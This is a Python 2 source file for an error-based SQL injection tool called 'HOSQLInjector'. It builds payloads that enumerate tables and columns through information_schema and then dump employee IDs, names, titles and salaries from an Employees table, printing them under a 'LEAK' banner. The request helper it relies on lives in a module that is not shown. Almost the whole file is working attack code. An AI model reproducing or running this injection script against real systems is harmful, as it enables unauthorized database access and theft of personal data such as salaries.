#-*- coding: utf-8 -*-

import httplib
import urllib
from urlparse import urlparse
import sys
import argparse
import setting as set

# Setting Argument








def prologue():
    print "==================HOSQLInjector=================="
    print ""



#dho dksehla

# def union_sql():

def error_based_sql():
    #First checking table nums
    get_cnt_query('t')
    get_cnt_query('c')
    get_cnt_query('d')


def get_data(div,count):
    print "Finded "+count+" data"
    print "============LEAK============"
    for i in range(0,int(count)):
        vuln_part = get_data_query(div,i)
        print set.vuln_httpreq(vuln_part)
    print "============================"


def get_data_query(div,count):
    if   div == 't':
        tname  = "(select+table_name+from+information_schema.tables+where+table_type='base+table'+limit+1+offset+"+str(count)+")"
        return tname
    elif div == 'c':
        cname = "(select+column_name+from+information_schema.columns+where+table_name='Employees'+limit+1+offset+"+str(count)+")"
        return cname
    elif div == 'd':
        dname = "(select+concat_ws(0x2c,EmployeeID,FirstName,Title,Salary)+from+Employees+limit+1+offset+"+str(count)+")"
        return dname


def get_cnt_query(div):
    if div == 't':
        tcount = "(select+count(*)+from+information_schema.tables+where+table_type='base+table')"  # table  개수 확인
        count  = set.vuln_httpreq(tcount)
        get_data('t',count)
    elif div == 'c':
        ccount = "(select+count(*)+from+information_schema.columns+where+table_name='Employees')"  # column 개수 확인
        count  = set.vuln_httpreq(ccount)
        get_data('c',count)
    elif div == 'd':
        dcount = "(select+count(*)+from+Employees)"                                                #data 개수 확인
        count  = set.vuln_httpreq(dcount)
        get_data('d',count)


